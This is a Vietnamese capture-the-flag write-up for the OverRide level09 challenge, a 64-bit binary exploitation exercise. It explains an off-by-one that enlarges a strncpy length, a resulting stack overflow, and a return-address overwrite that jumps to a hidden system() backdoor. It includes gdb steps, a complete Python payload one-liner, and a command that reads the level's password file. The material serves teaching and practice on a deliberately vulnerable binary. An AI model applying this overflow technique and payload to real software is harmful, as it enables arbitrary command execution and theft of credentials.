
RELRO               STACK CANARY        NX                PIE                RPATH        RUNPATH         FILE
Partial RELRO 🟡  No canary found 🔴     NX enabled 🟢     PIE enabled 🟢     No RPATH 🟢   No RUNPATH 🟢   /home/users/level09/level09

------------

# Nhật ký giải OverRide Level09 🏴

## Tổng quan

Đây là một bài **binary exploitation** trên Linux 64-bit. Mục tiêu là đọc file `/home/users/end/.pass` bằng cách khai thác lỗ hổng trong chương trình `level09`.

---

## Bước 1: Trinh sát - Hiểu chương trình làm gì

Chạy thử chương trình:
```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: thao
>: Welcome, thao
>: Msg @Unix-Dude
>>: hello
>: Msg sent!
```

Chương trình đơn giản: nhập username → nhập message → gửi. Không có gì đặc biệt... **nhưng trong code thì có!**

---

## Bước 2: Đọc code (Ghidra decompile)

Có 4 hàm quan trọng:

### 🔑 `secret_backdoor` - Hàm ẩn không bao giờ được gọi
```c
void secret_backdoor(void) {
    char local_88[128];
    fgets(local_88, 0x80, stdin);
    system(local_88);  // ← Chạy bất kỳ lệnh shell nào!
}
```
Hàm này **không bao giờ được gọi** trong luồng bình thường, nhưng nếu ta nhảy vào được thì có thể chạy lệnh tùy ý → đọc được flag!

---

### 🏠 `handle_msg` - Hàm trung tâm
```c
void handle_msg(void) {
    undefined1 local_c8[140];  // ← buffer chính, là 1 struct
    // ...
    undefined4 local_14 = 0x8c;  // ← con số giới hạn, ở offset +0xb4
    
    set_username(local_c8);
    set_msg(local_c8);
}
```

Buffer `local_c8` được dùng như một **struct** với layout:
```
Offset 0x00 → 0x8b  : vùng chứa message (140 bytes)
Offset 0x8c → 0xb3  : vùng chứa username (40 bytes)  
Offset 0xb4         : local_14 = 0x8c = 140 (giới hạn copy)
```

---

### 👤 `set_username` - Chứa lỗ hổng đầu tiên
```c
void set_username(long param_1) {
    char local_98[140];
    int local_c;
    
    fgets(local_98, 0x80, stdin);  // đọc tối đa 128 bytes
    
    // Vòng lặp copy vào param_1 + 0x8c (vùng username)
    for (local_c = 0; (local_c < 0x29 && local_98[local_c] != '\0'); local_c++) {
        *(char*)(param_1 + 0x8c + local_c) = local_98[local_c];
    }
}
```

**Điểm mấu chốt:** `0x29 = 41` lần lặp, ghi vào `param_1 + 0x8c + 0` đến `param_1 + 0x8c + 40`.

Nhưng `local_14` nằm ở `param_1 + 0xb4`:
```
0x8c + 40 = 0x8c + 0x28 = 0xb4  ✓
```
→ **Byte thứ 41 của username ghi đúng vào `local_14`!**

Nếu byte thứ 41 là `\xff` (= 255), thì `local_14` bị đổi từ `140` thành `255`.

---

### ✉️ `set_msg` - Chứa lỗ hổng thứ hai
```c
void set_msg(char *param_1) {
    char local_408[1024];
    
    fgets(local_408, 0x400, stdin);  // đọc tối đa 1024 bytes
    strncpy(param_1, local_408, (long)*(int*)(param_1 + 0xb4));
    //                           ↑ đọc local_14 làm giới hạn!
}
```

`strncpy` copy tối đa `local_14` bytes. Nếu ta đã đổi `local_14` thành `255`, nó sẽ copy **255 bytes** vào buffer chỉ có 140 bytes → **Buffer Overflow!**

---

## Bước 3: Vẽ bản đồ stack

```
handle_msg stack frame:
┌─────────────────────────────┐  ← rbp - 0xc0
│  local_c8[140]              │  offset +0x00: message (140 bytes)
│  ...                        │
│  ───────────── offset 0x8c  │  ← vùng username bắt đầu
│  username[40]               │  40 bytes
│  ───────────── offset 0xb4  │
│  local_14 = 0x8c (4 bytes)  │  ← bị ghi đè bởi username[40]
│  ...padding...              │
├─────────────────────────────┤  ← rbp
│  saved RBP (8 bytes)        │
├─────────────────────────────┤  ← rbp + 8
│  return address (8 bytes)   │  ← MỤC TIÊU CẦN GHI ĐÈ
└─────────────────────────────┘
```

**Tính offset từ đầu buffer đến return address:**
- `local_c8` ở `rbp - 0xc0` → cách rbp `0xc0 = 192` bytes
- return address ở `rbp + 8`
- Tổng: `192 + 8 = 200` bytes padding, sau đó là return address

---

## Bước 4: Kiểm tra bảo vệ

```bash
# Kết quả checksec:
Partial RELRO 🟡  
No canary    🔴  ← Không có stack canary → overflow dễ hơn!
NX enabled   🟢  ← Không chạy shellcode trực tiếp được
PIE enabled  🟢  ← Địa chỉ thay đổi mỗi lần chạy
```

**PIE enabled** là thách thức: địa chỉ `secret_backdoor` không cố định.

---

## Bước 5: Tìm địa chỉ thực của secret_backdoor

Vì PIE, ta cần tìm **base address** lúc runtime:

```bash
gdb -q ./level09
(gdb) break main
(gdb) run
(gdb) info proc mappings
# → Start Addr: 0x555555554000  ← đây là base!

(gdb) p secret_backdoor
# → offset: 0x88c
```

Địa chỉ thực:
```
0x555555554000 + 0x88c = 0x55555555488c
```

Kiểm tra ASLR:
```bash
cat /proc/sys/kernel/randomize_va_space
# → 0  ← ASLR tắt! Địa chỉ cố định mỗi lần chạy → exploit ổn định
```

---

## Bước 6: Xây dựng payload

Exploit gồm **3 phần** gửi vào stdin:

```
Phần 1 - USERNAME:
'A' × 40 + '\xff'
└─ 40 ký tự bình thường để fill vùng username
└─ byte '\xff' = 255 ghi vào local_14, tăng giới hạn strncpy lên 255

Phần 2 - MESSAGE:
'B' × 200 + địa_chỉ_secret_backdoor (8 bytes, little-endian)
└─ 200 bytes padding để đến đúng vị trí return address
└─ 8 bytes địa chỉ ghi đè return address

Phần 3 - LỆNH (sau khi nhảy vào secret_backdoor):
'cat /home/users/end/.pass\n'
└─ secret_backdoor gọi fgets rồi system() với input này
```

---

## Bước 7: Chạy exploit

```bash
# Bước 1: payload overflow + giữ stdin mở
(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09

# Bước 2: sau khi secret_backdoor() gọi fgets(), gõ lệnh muốn chạy:
cat /home/users/end/.pass | cat
```

- `<` = little-endian (x86 lưu bytes từ thấp đến cao)
- Biến `0x55555555488c` thành `\x8c\x48\x55\x55\x55\x55\x00\x00`

---

## Sơ đồ luồng tấn công

```
set_username()                    set_msg()
     │                                │
     │  username = 'A'*40 + '\xff'    │  msg = 'B'*200 + addr
     │                                │
     ▼                                ▼
local_14 bị đổi              strncpy copy 255 bytes
  0x8c → 0xff                  tràn qua saved RBP
                                  └→ ghi đè return address
                                         │
                                         ▼
                               ret nhảy vào secret_backdoor()
                                         │
                                         ▼
                               fgets() đọc "cat /home/users/end/.pass"
                                         │
                                         ▼
                               system() chạy lệnh → in flag! 🎉
```

---

## Tóm tắt các lỗ hổng

| Lỗ hổng | Vị trí | Nguyên nhân |
|---|---|---|
| Off-by-one | `set_username` | Loop đến `0x29=41` nhưng username chỉ có 40 bytes |
| Buffer Overflow | `set_msg` | `strncpy` dùng giá trị bị kiểm soát bởi attacker |
| Không có canary | Binary | Không phát hiện được stack overflow |